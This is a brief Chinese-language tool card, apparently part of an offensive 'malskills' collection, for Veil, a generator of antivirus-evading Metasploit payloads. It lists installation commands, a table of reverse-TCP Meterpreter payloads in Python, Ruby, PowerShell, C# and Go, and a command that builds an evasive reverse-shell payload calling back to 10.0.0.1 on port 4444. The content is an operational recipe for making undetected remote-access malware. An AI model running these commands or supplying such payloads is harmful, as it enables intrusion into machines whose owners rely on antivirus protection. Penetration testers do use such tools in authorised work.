---
name: "veil"
description: ">"
---

# Veil

*Sourced from killvxk-malskills-zh*

# Veil

用于 Metasploit 的 AV 绕过 (AV Evasion) Payload 生成器。

## 快速开始

```bash
git clone https://github.com/Veil-Framework/Veil && cd Veil && ./config/setup.sh
./Veil.py
./Veil.py --list-tools
```

## 关键绕过 Payload

| Payload | 语言 |
|---------|----------|
| `python/meterpreter/rev_tcp` | Python shellcode 运行器 |
| `ruby/meterpreter/rev_tcp` | Ruby 运行器 |
| `powershell/meterpreter/rev_tcp` | PowerShell 运行器 |
| `cs/meterpreter/rev_tcp` | C# 编译后的 dropper |
| `go/meterpreter/rev_tcp` | Go 编译后的运行器 |

## 生成 Payload

```bash
./Veil.py -t Evasion --payload python/meterpreter/rev_tcp \
  --ip 10.0.0.1 --port 4444 --output veil_payload
```

## 参考资源

| 文件 | 何时加载 |
|------|--------------|
| `references/` | 完整 payload 列表及混淆技术 |

